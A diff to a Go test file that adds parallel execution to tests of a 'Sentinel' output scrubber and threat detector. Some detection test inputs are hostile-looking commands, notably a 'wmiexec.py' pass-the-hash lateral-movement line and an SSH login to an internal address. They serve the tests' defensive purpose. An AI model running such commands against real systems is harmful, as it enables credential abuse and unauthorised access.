 func TestSentinel_ExtractThreatCategories(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("extracts unique categories", func(t *testing.T) {
+		t.Parallel()
 		signals := []ThreatSignal{
 			{Category: ThreatCategoryReverseShell},
 			{Category: ThreatCategoryReverseShell},
@@ -1512,12 +1625,14 @@ func TestSentinel_ExtractThreatCategories(t *testing.T) {
 	})
 
 	t.Run("empty signals returns empty", func(t *testing.T) {
+		t.Parallel()
 		categories := sentinel.extractThreatCategories(nil)
 		assert.Empty(t, categories)
 	})
 }
 
 func TestSentinel_DetectThreats_LateralMovement(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -1580,6 +1695,7 @@ func TestSentinel_DetectThreats_LateralMovement(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			signals := sentinel.detectThreats(tt.input)
 			if tt.shouldFind {
 				found := false
@@ -1603,6 +1719,7 @@ func TestSentinel_DetectThreats_LateralMovement(t *testing.T) {
 }
 
 func TestSentinel_DetectThreats_ResourceHijacking(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -1645,6 +1762,7 @@ func TestSentinel_DetectThreats_ResourceHijacking(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			signals := sentinel.detectThreats(tt.input)
 			if tt.shouldFind {
 				found := false
@@ -1668,9 +1786,11 @@ func TestSentinel_DetectThreats_ResourceHijacking(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_MaxOutputLength(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 
 	t.Run("truncates when exceeding max length", func(t *testing.T) {
+		t.Parallel()
 		config := &SentinelConfig{Enabled: true, StrictMode: false, MaxOutputLength: 50}
 		sentinel := NewSentinel(config, logger)
 
@@ -1681,6 +1801,7 @@ func TestSentinel_ScrubText_MaxOutputLength(t *testing.T) {
 	})
 
 	t.Run("does not truncate when within limit", func(t *testing.T) {
+		t.Parallel()
 		config := &SentinelConfig{Enabled: true, StrictMode: false, MaxOutputLength: 1000}
 		sentinel := NewSentinel(config, logger)
 
@@ -1691,6 +1812,7 @@ func TestSentinel_ScrubText_MaxOutputLength(t *testing.T) {
 	})
 
 	t.Run("zero max length means no limit", func(t *testing.T) {
+		t.Parallel()
 		config := &SentinelConfig{Enabled: true, StrictMode: false, MaxOutputLength: 0}
 		sentinel := NewSentinel(config, logger)
 
@@ -1701,6 +1823,7 @@ func TestSentinel_ScrubText_MaxOutputLength(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_IPv6_Preserved(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -1717,6 +1840,7 @@ func TestSentinel_ScrubText_IPv6_Preserved(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			result := sentinel.ScrubText(tt.input)
 			assert.Equal(t, tt.expected, result, "Input: %s", tt.input)
 		})
@@ -1724,6 +1848,7 @@ func TestSentinel_ScrubText_IPv6_Preserved(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_URLs_Preserved(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -1745,6 +1870,7 @@ func TestSentinel_ScrubText_URLs_Preserved(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_URLsWithCredentials(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -1765,6 +1891,7 @@ func TestSentinel_ScrubText_URLsWithCredentials(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_Hostnames_Preserved(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -1785,6 +1912,7 @@ func TestSentinel_ScrubText_Hostnames_Preserved(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_FilenamesAndHostnames_AllPreserved(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -1809,6 +1937,7 @@ func TestSentinel_ScrubText_FilenamesAndHostnames_AllPreserved(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+		t.Parallel()
 			result := sentinel.ScrubText(tt.input)
 			assert.Equal(t, tt.expected, result)
 		})
@@ -1816,6 +1945,7 @@ func TestSentinel_ScrubText_FilenamesAndHostnames_AllPreserved(t *testing.T) {
 }
 
 func TestSentinel_ScrubText_MACAddresses_Preserved(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
@@ -1837,10 +1967,12 @@ func TestSentinel_ScrubText_MACAddresses_Preserved(t *testing.T) {
 }
 
 func TestSentinel_IsScrubberPlaceholder(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("valid placeholders", func(t *testing.T) {
+		t.Parallel()
 		validPlaceholders := []string{
 			"[IP_ADDR]",
 			"[EMAIL]",
@@ -1858,11 +1990,13 @@ func TestSentinel_IsScrubberPlaceholder(t *testing.T) {
 	})
 
 	t.Run("valid placeholders with whitespace", func(t *testing.T) {
+		t.Parallel()
 		assert.True(t, sentinel.isScrubberPlaceholder("  [PATH]  "))
 		assert.True(t, sentinel.isScrubberPlaceholder("\t[EMAIL]\t"))
 	})
 
 	t.Run("invalid placeholders", func(t *testing.T) {
+		t.Parallel()
 		invalidPlaceholders := []string{
 			"[lowercase]",
 			"[Mixed_Case]",
@@ -1882,22 +2016,26 @@ func TestSentinel_IsScrubberPlaceholder(t *testing.T) {
 }
 
 func TestSentinel_SanitizeForDisplay(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
 
 	t.Run("preserves IPs in display text", func(t *testing.T) {
+		t.Parallel()
 		result := sentinel.SanitizeForDisplay("Server at 192.168.1.1 port 8080")
 		assert.Contains(t, result, "192.168.1.1")
 	})
 
 	t.Run("scrubs emails in display text", func(t *testing.T) {
+		t.Parallel()
 		result := sentinel.SanitizeForDisplay("Contact admin@company.com for help")
 		assert.Contains(t, result, "[EMAIL]")
 		assert.NotContains(t, result, "admin@company.com")
 	})
 
 	t.Run("preserves non-sensitive text", func(t *testing.T) {
+		t.Parallel()
 		result := sentinel.SanitizeForDisplay("Status: OK, 42 rows processed")
 		assert.Contains(t, result, "Status: OK")
 		assert.Contains(t, result, "42 rows processed")
@@ -1905,6 +2043,7 @@ func TestSentinel_SanitizeForDisplay(t *testing.T) {
 }
 
 func TestSentinel_CategorizeWarning(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -1928,6 +2067,7 @@ func TestSentinel_CategorizeWarning(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.input, func(t *testing.T) {
+		t.Parallel()
 			result := sentinel.categorizeWarning(tt.input)
 			assert.Equal(t, tt.expected, result, "Input: %s", tt.input)
 		})
@@ -1935,21 +2075,25 @@ func TestSentinel_CategorizeWarning(t *testing.T) {
 }
 
 func TestSentinel_ExtractWarnings(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
 
 	t.Run("empty stderr returns nil", func(t *testing.T) {
+		t.Parallel()
 		warnings := sentinel.extractWarnings("")
 		assert.Nil(t, warnings)
 	})
 
 	t.Run("stderr with no warnings returns nil", func(t *testing.T) {
+		t.Parallel()
 		warnings := sentinel.extractWarnings("Error: file not found\nFailed to connect")
 		assert.Nil(t, warnings)
 	})
 
 	t.Run("extracts categorized warnings", func(t *testing.T) {
+		t.Parallel()
 		stderr := "WARN deprecated package\nWARNING: insecure protocol\nError: actual error"
 		warnings := sentinel.extractWarnings(stderr)
 		require.NotNil(t, warnings)
@@ -1959,6 +2103,7 @@ func TestSentinel_ExtractWarnings(t *testing.T) {
 	})
 
 	t.Run("extracts scrubbed uncategorized warnings", func(t *testing.T) {
+		t.Parallel()
 		stderr := "WARN: some unexpected warning about stuff"
 		warnings := sentinel.extractWarnings(stderr)
 		require.NotNil(t, warnings)
@@ -1969,26 +2114,31 @@ func TestSentinel_ExtractWarnings(t *testing.T) {
 }
 
 func TestSentinel_ExtractRowCount(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("no output returns nil", func(t *testing.T) {
+		t.Parallel()
 		count := sentinel.extractRowCount("")
 		assert.Nil(t, count)
 	})
 
 	t.Run("only empty lines returns nil", func(t *testing.T) {
+		t.Parallel()
 		count := sentinel.extractRowCount("\n\n\n")
 		assert.Nil(t, count)
 	})
 
 	t.Run("counts non-empty data lines", func(t *testing.T) {
+		t.Parallel()
 		count := sentinel.extractRowCount("line1\nline2\nline3")
 		require.NotNil(t, count)
 		assert.Equal(t, 3, *count)
 	})
 
 	t.Run("skips header and footer patterns", func(t *testing.T) {
+		t.Parallel()
 		output := "# Header comment\n-- SQL separator\ndata line 1\ndata line 2\n+----+\n== Footer =="
 		count := sentinel.extractRowCount(output)
 		require.NotNil(t, count)
@@ -1996,6 +2146,7 @@ func TestSentinel_ExtractRowCount(t *testing.T) {
 	})
 
 	t.Run("skips empty lines in count", func(t *testing.T) {
+		t.Parallel()
 		output := "data1\n\ndata2\n\n\ndata3"
 		count := sentinel.extractRowCount(output)
 		require.NotNil(t, count)
@@ -2004,11 +2155,13 @@ func TestSentinel_ExtractRowCount(t *testing.T) {
 }
 
 func TestSentinel_BuildSummary(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
 
 	t.Run("successful command with output", func(t *testing.T) {
+		t.Parallel()
 		result := &CommandResult{
 			Command:    "ls -la",
 			ExitCode:   0,
@@ -2023,6 +2176,7 @@ func TestSentinel_BuildSummary(t *testing.T) {
 	})
 
 	t.Run("failed command with error", func(t *testing.T) {
+		t.Parallel()
 		result := &CommandResult{
 			Command:    "cat /nonexistent",
 			ExitCode:   1,
@@ -2037,6 +2191,7 @@ func TestSentinel_BuildSummary(t *testing.T) {
 	})
 
 	t.Run("empty command", func(t *testing.T) {
+		t.Parallel()
 		result := &CommandResult{
 			Command:    "",
 			ExitCode:   0,
@@ -2050,6 +2205,7 @@ func TestSentinel_BuildSummary(t *testing.T) {
 	})
 
 	t.Run("killed process", func(t *testing.T) {
+		t.Parallel()
 		result := &CommandResult{
 			Command:    "sleep 999",
 			ExitCode:   137,
@@ -2063,53 +2219,63 @@ func TestSentinel_BuildSummary(t *testing.T) {
 }
 
 func TestSentinel_LooksLikeKeyValue(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("colon-separated key value", func(t *testing.T) {
+		t.Parallel()
 		assert.True(t, sentinel.looksLikeKeyValue("Key: Value"))
 		assert.True(t, sentinel.looksLikeKeyValue("  Name: John Doe"))
 	})
 
 	t.Run("equals-separated key value", func(t *testing.T) {
+		t.Parallel()
 		assert.True(t, sentinel.looksLikeKeyValue("DB_HOST=localhost"))
 		assert.True(t, sentinel.looksLikeKeyValue("count=42"))
 	})
 
 	t.Run("comment lines with equals are not key-value", func(t *testing.T) {
+		t.Parallel()
 		assert.False(t, sentinel.looksLikeKeyValue("# comment with = sign"))
 		assert.False(t, sentinel.looksLikeKeyValue("  # DISABLED=true"))
 	})
 
 	t.Run("plain text is not key-value", func(t *testing.T) {
+		t.Parallel()
 		assert.False(t, sentinel.looksLikeKeyValue("just plain text"))
 		assert.False(t, sentinel.looksLikeKeyValue("no delimiter here"))
 	})
 }
 
 func TestSentinel_ExtractKey(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
 
 	t.Run("extracts key from colon-separated", func(t *testing.T) {
+		t.Parallel()
 		key := sentinel.extractKey("hostname: server.example.com")
 		// The key "hostname" gets scrubbed through ScrubText
 		assert.NotEmpty(t, key)
 	})
 
 	t.Run("extracts key from equals-separated", func(t *testing.T) {
+		t.Parallel()
 		key := sentinel.extractKey("count=42")
 		assert.NotEmpty(t, key)
 	})
 
 	t.Run("returns [KEY] when no delimiter", func(t *testing.T) {
+		t.Parallel()
 		key := sentinel.extractKey("no delimiter here")
 		assert.Equal(t, "[KEY]", key)
 	})
 }
 
 func TestSentinel_IsLikelySensitiveKey(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
@@ -2148,11 +2314,13 @@ func TestSentinel_IsLikelySensitiveKey(t *testing.T) {
 }
 
 func TestSentinel_ScrubMap_Slices(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: false}
 	sentinel := NewSentinel(config, logger)
 
 	t.Run("scrubs string values in slices", func(t *testing.T) {
+		t.Parallel()
 		data := map[string]interface{}{
 			"emails": []interface{}{"user@test.com", "admin@corp.com"},
 		}
@@ -2164,6 +2332,7 @@ func TestSentinel_ScrubMap_Slices(t *testing.T) {
 	})
 
 	t.Run("preserves IPs in nested maps in slices", func(t *testing.T) {
+		t.Parallel()
 		data := map[string]interface{}{
 			"servers": []interface{}{
 				map[string]interface{}{
@@ -2184,6 +2353,7 @@ func TestSentinel_ScrubMap_Slices(t *testing.T) {
 	})
 
 	t.Run("handles nested slices in slices", func(t *testing.T) {
+		t.Parallel()
 		data := map[string]interface{}{
 			"matrix": []interface{}{
 				[]interface{}{"user@a.com", "safe"},
@@ -2197,6 +2367,7 @@ func TestSentinel_ScrubMap_Slices(t *testing.T) {
 	})
 
 	t.Run("preserves non-string slice elements", func(t *testing.T) {
+		t.Parallel()
 		data := map[string]interface{}{
 			"numbers": []interface{}{1, 2, 3},
 			"mixed":   []interface{}{"user@test.com", 42, true},
@@ -2214,6 +2385,7 @@ func TestSentinel_ScrubMap_Slices(t *testing.T) {
 	})
 
 	t.Run("handles unknown types", func(t *testing.T) {
+		t.Parallel()
 		data := map[string]interface{}{
 			"unknown": struct{ Name string }{"test"},
 		}
@@ -2223,6 +2395,7 @@ func TestSentinel_ScrubMap_Slices(t *testing.T) {
 }
 
 func TestSentinel_ScrubCommandResult_Disabled(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: false}
 	sentinel := NewSentinel(config, logger)
@@ -2245,6 +2418,7 @@ func TestSentinel_ScrubCommandResult_Disabled(t *testing.T) {
 }
 
 func TestRegexThreatDetector_Interface(t *testing.T) {
+	t.Parallel()
 	detector := &RegexThreatDetector{
 		name:           "test_regex_detector",
 		pattern:        regexp.MustCompile(`evil_pattern`),
@@ -2257,10 +2431,12 @@ func TestRegexThreatDetector_Interface(t *testing.T) {
 	}
 
 	t.Run("Name returns detector name", func(t *testing.T) {
+		t.Parallel()
 		assert.Equal(t, "test_regex_detector", detector.Name())
 	})
 
 	t.Run("Detect returns signal on match", func(t *testing.T) {
+		t.Parallel()
 		signals := detector.Detect("found evil_pattern in output")
 		require.Len(t, signals, 1)
 		assert.Equal(t, ThreatCategoryMalwareDeployment, signals[0].Category)
@@ -2275,12 +2451,14 @@ func TestRegexThreatDetector_Interface(t *testing.T) {
 	})
 
 	t.Run("Detect returns nil on no match", func(t *testing.T) {
+		t.Parallel()
 		signals := detector.Detect("completely safe output")
 		assert.Nil(t, signals)
 	})
 }
 
 func TestSentinel_CustomScrubPatterns_Invalid(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{
 		Enabled:    true,
@@ -2304,14 +2482,17 @@ func TestSentinel_CustomScrubPatterns_Invalid(t *testing.T) {
 }
 
 func TestSentinel_DetermineStatus_AdditionalCodes(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("exit code 128 is invalid_exit", func(t *testing.T) {
+		t.Parallel()
 		assert.Equal(t, constants.SentinelStatusInvalidExit, sentinel.determineStatus(128))
 	})
 
 	t.Run("signal-based exit codes above 128", func(t *testing.T) {
+		t.Parallel()
 		// SIGABRT = 134 (128 + 6)
 		assert.Equal(t, constants.SentinelStatus("signal_6"), sentinel.determineStatus(134))
 		// SIGFPE = 136 (128 + 8)
@@ -2319,6 +2500,7 @@ func TestSentinel_DetermineStatus_AdditionalCodes(t *testing.T) {
 	})
 
 	t.Run("normal error codes", func(t *testing.T) {
+		t.Parallel()
 		// Codes not in the switch fall through to error
 		assert.Equal(t, constants.SentinelStatusError, sentinel.determineStatus(3))
 		assert.Equal(t, constants.SentinelStatusError, sentinel.determineStatus(42))
@@ -2327,20 +2509,24 @@ func TestSentinel_DetermineStatus_AdditionalCodes(t *testing.T) {
 }
 
 func TestSentinel_CategorizeError_EdgeCases(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("connection reset", func(t *testing.T) {
+		t.Parallel()
 		result := sentinel.categorizeError("Connection reset by peer", 1)
 		assert.Equal(t, "connection_reset", result)
 	})
 
 	t.Run("resource busy / locked", func(t *testing.T) {
+		t.Parallel()
 		result := sentinel.categorizeError("Database is locked", 1)
 		assert.Equal(t, "resource_busy", result)
 	})
 
 	t.Run("case insensitive matching", func(t *testing.T) {
+		t.Parallel()
 		assert.Equal(t, "permission_denied", sentinel.categorizeError("PERMISSION DENIED", 1))
 		assert.Equal(t, "timeout", sentinel.categorizeError("TIMED OUT", 1))
 		assert.Equal(t, "out_of_memory", sentinel.categorizeError("OOM killed", 1))
@@ -2348,11 +2534,13 @@ func TestSentinel_CategorizeError_EdgeCases(t *testing.T) {
 }
 
 func TestSentinel_ScrubDataValues(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{Enabled: true, StrictMode: true}
 	sentinel := NewSentinel(config, logger)
 
 	t.Run("redacts values for sensitive keys", func(t *testing.T) {
+		t.Parallel()
 		input := "password: mysecret123\nusername: admin\ntoken: abc123"
 		result := sentinel.scrubDataValues(input)
 		assert.Contains(t, result, "[VALUE]")
@@ -2361,6 +2549,7 @@ func TestSentinel_ScrubDataValues(t *testing.T) {
 	})
 
 	t.Run("preserves non-sensitive key-value pairs", func(t *testing.T) {
+		t.Parallel()
 		input := "status: running\ncount: 42\nversion: 1.2.3"
 		result := sentinel.scrubDataValues(input)
 		assert.Contains(t, result, "status: running")
@@ -2369,6 +2558,7 @@ func TestSentinel_ScrubDataValues(t *testing.T) {
 	})
 
 	t.Run("preserves empty lines", func(t *testing.T) {
+		t.Parallel()
 		input := "line1\n\nline3"
 		result := sentinel.scrubDataValues(input)
 		lines := strings.Split(result, "\n")
@@ -2377,6 +2567,7 @@ func TestSentinel_ScrubDataValues(t *testing.T) {
 	})
 
 	t.Run("handles plain text lines without delimiters", func(t *testing.T) {
+		t.Parallel()
 		input := "Just a regular line of text"
 		result := sentinel.scrubDataValues(input)
 		assert.Equal(t, "Just a regular line of text", result)
@@ -2384,16 +2575,19 @@ func TestSentinel_ScrubDataValues(t *testing.T) {
 }
 
 func TestSentinel_ValidateNoLeakage_PrivateKey(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("detects private key markers", func(t *testing.T) {
+		t.Parallel()
 		ok, violations := sentinel.ValidateNoLeakage("-----BEGIN RSA PRIVATE KEY-----\nMIIE...")
 		assert.False(t, ok)
 		assert.Contains(t, violations, "private_key")
 	})
 
 	t.Run("uuid is allowed (preserved for troubleshooting)", func(t *testing.T) {
+		t.Parallel()
 		ok, violations := sentinel.ValidateNoLeakage("ID: 550e8400-e29b-41d4-a716-446655440000")
 		assert.True(t, ok)
 		assert.Empty(t, violations)
@@ -2401,10 +2595,12 @@ func TestSentinel_ValidateNoLeakage_PrivateKey(t *testing.T) {
 }
 
 func TestSentinel_ExtractStructureHints_TabDelimited(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("tab delimited data detects columns", func(t *testing.T) {
+		t.Parallel()
 		hints := sentinel.extractStructureHints("id\tname\temail\n1\tJohn\tj@x.com")
 		found := false
 		for _, h := range hints {
@@ -2416,12 +2612,14 @@ func TestSentinel_ExtractStructureHints_TabDelimited(t *testing.T) {
 	})
 
 	t.Run("single line has output_lines hint", func(t *testing.T) {
+		t.Parallel()
 		hints := sentinel.extractStructureHints("single line")
 		assert.Contains(t, hints, "output_lines: 1")
 	})
 }
 
 func TestSentinel_DetectThreats_Disabled(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	config := &SentinelConfig{
 		Enabled:         true,
@@ -2434,10 +2632,12 @@ func TestSentinel_DetectThreats_Disabled(t *testing.T) {
 }
 
 func TestSentinel_ThreatSignal_LateralMovement_MITREMapping(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("SSH lateral movement has correct MITRE mapping", func(t *testing.T) {
+		t.Parallel()
 		signals := sentinel.detectThreats("ssh admin@192.168.1.100")
 		require.NotEmpty(t, signals)
 		found := false
@@ -2451,6 +2651,7 @@ func TestSentinel_ThreatSignal_LateralMovement_MITREMapping(t *testing.T) {
 	})
 
 	t.Run("pass the hash has correct MITRE mapping", func(t *testing.T) {
+		t.Parallel()
 		signals := sentinel.detectThreats("wmiexec.py admin:hash@target")
 		require.NotEmpty(t, signals)
 		found := false
@@ -2469,10 +2670,12 @@ func TestSentinel_ThreatSignal_LateralMovement_MITREMapping(t *testing.T) {
 // ===========================================
 
 func TestSentinel_LoadDoctrinesFromProtocol_MissingDirectory(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("gracefully handles missing doctrine directory", func(t *testing.T) {
+		t.Parallel()
 		// Create a sentinel with a non-existent protocol directory
 		workDir := t.TempDir()
 		fakeProtocolDir := filepath.Join(workDir, "protocol")
@@ -2496,10 +2699,12 @@ func TestSentinel_LoadDoctrinesFromProtocol_MissingDirectory(t *testing.T) {
 }
 
 func TestSentinel_LoadDoctrinesFromProtocol_InvalidJSON(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("handles invalid JSON in doctrine file", func(t *testing.T) {
+		t.Parallel()
 		workDir := t.TempDir()
 		protocolDir := filepath.Join(workDir, "protocol")
 		doctrineDir := filepath.Join(protocolDir, "constants", "doctrine")
@@ -2526,10 +2731,12 @@ func TestSentinel_LoadDoctrinesFromProtocol_InvalidJSON(t *testing.T) {
 }
 
 func TestSentinel_LoadDoctrinesFromProtocol_DisabledDoctrineFiltering(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("filters out disabled doctrines", func(t *testing.T) {
+		t.Parallel()
 		workDir := t.TempDir()
 		protocolDir := filepath.Join(workDir, "protocol")
 		doctrineDir := filepath.Join(protocolDir, "constants", "doctrine")
@@ -2601,10 +2808,12 @@ func TestSentinel_LoadDoctrinesFromProtocol_DisabledDoctrineFiltering(t *testing
 }
 
 func TestSentinel_LoadDoctrinesFromProtocol_InvalidRegexPattern(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("handles invalid regex patterns gracefully", func(t *testing.T) {
+		t.Parallel()
 		workDir := t.TempDir()
 		protocolDir := filepath.Join(workDir, "protocol")
 		doctrineDir := filepath.Join(protocolDir, "constants", "doctrine")
@@ -2659,10 +2868,12 @@ func TestSentinel_LoadDoctrinesFromProtocol_InvalidRegexPattern(t *testing.T) {
 }
 
 func TestSentinel_DoctrineToDetector(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("converts doctrine to threat detector correctly", func(t *testing.T) {
+		t.Parallel()
 		doctrine := doctrineData{
 			ID:          "test_detector_1",
 			Name:        "Test Detector",
@@ -2693,6 +2904,7 @@ func TestSentinel_DoctrineToDetector(t *testing.T) {
 	})
 
 	t.Run("maps severity strings correctly", func(t *testing.T) {
+		t.Parallel()
 		tests := []struct {
 			input    string
 			expected ThreatSeverity
@@ -2708,6 +2920,7 @@ func TestSentinel_DoctrineToDetector(t *testing.T) {
 
 		for _, tt := range tests {
 			t.Run(tt.input, func(t *testing.T) {
+		t.Parallel()
 				doctrine := doctrineData{
 					ID:         "test",
 					Name:       "Test",
@@ -2725,6 +2938,7 @@ func TestSentinel_DoctrineToDetector(t *testing.T) {
 	})
 
 	t.Run("maps category strings correctly", func(t *testing.T) {
+		t.Parallel()
 		tests := []struct {
 			input    string
 			expected ThreatCategory
@@ -2738,6 +2952,7 @@ func TestSentinel_DoctrineToDetector(t *testing.T) {
 
 		for _, tt := range tests {
 			t.Run(tt.input, func(t *testing.T) {
+		t.Parallel()
 				doctrine := doctrineData{
 					ID:         "test",
 					Name:       "Test",
@@ -2755,6 +2970,7 @@ func TestSentinel_DoctrineToDetector(t *testing.T) {
 	})
 
 	t.Run("returns error for invalid regex pattern", func(t *testing.T) {
+		t.Parallel()
 		doctrine := doctrineData{
 			ID:         "test_invalid",
 			Name:       "Invalid Pattern",
@@ -2773,10 +2989,12 @@ func TestSentinel_DoctrineToDetector(t *testing.T) {
 }
 
 func TestSentinel_LoadDoctrinesFromProtocol_SkipsRegistry(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("skips doctrine_registry.json file", func(t *testing.T) {
+		t.Parallel()
 		workDir := t.TempDir()
 		protocolDir := filepath.Join(workDir, "protocol")
 		doctrineDir := filepath.Join(protocolDir, "constants", "doctrine")
@@ -2830,10 +3048,12 @@ func TestSentinel_LoadDoctrinesFromProtocol_SkipsRegistry(t *testing.T) {
 }
 
 func TestSentinel_LoadDoctrinesFromProtocol_SkipsNonJSON(t *testing.T) {
+	t.Parallel()
 	logger := testutil.NewTestLogger()
 	sentinel := NewSentinel(nil, logger)
 
 	t.Run("skips non-JSON files in doctrine directory", func(t *testing.T) {
+		t.Parallel()
 		workDir := t.TempDir()
 		protocolDir := filepath.Join(workDir, "protocol")
 		doctrineDir := filepath.Join(protocolDir, "constants", "doctrine")
@@ -2888,7 +3108,9 @@ func TestSentinel_LoadDoctrinesFromProtocol_SkipsNonJSON(t *testing.T) {
 }
 
 func TestSentinel_LoadDoctrinesFromProtocol_NilLogger(t *testing.T) {
+	t.Parallel()
 	t.Run("returns early when logger is nil", func(t *testing.T) {
+		t.Parallel()
 		sentinel := &Sentinel{
 			logger: nil,
 		}
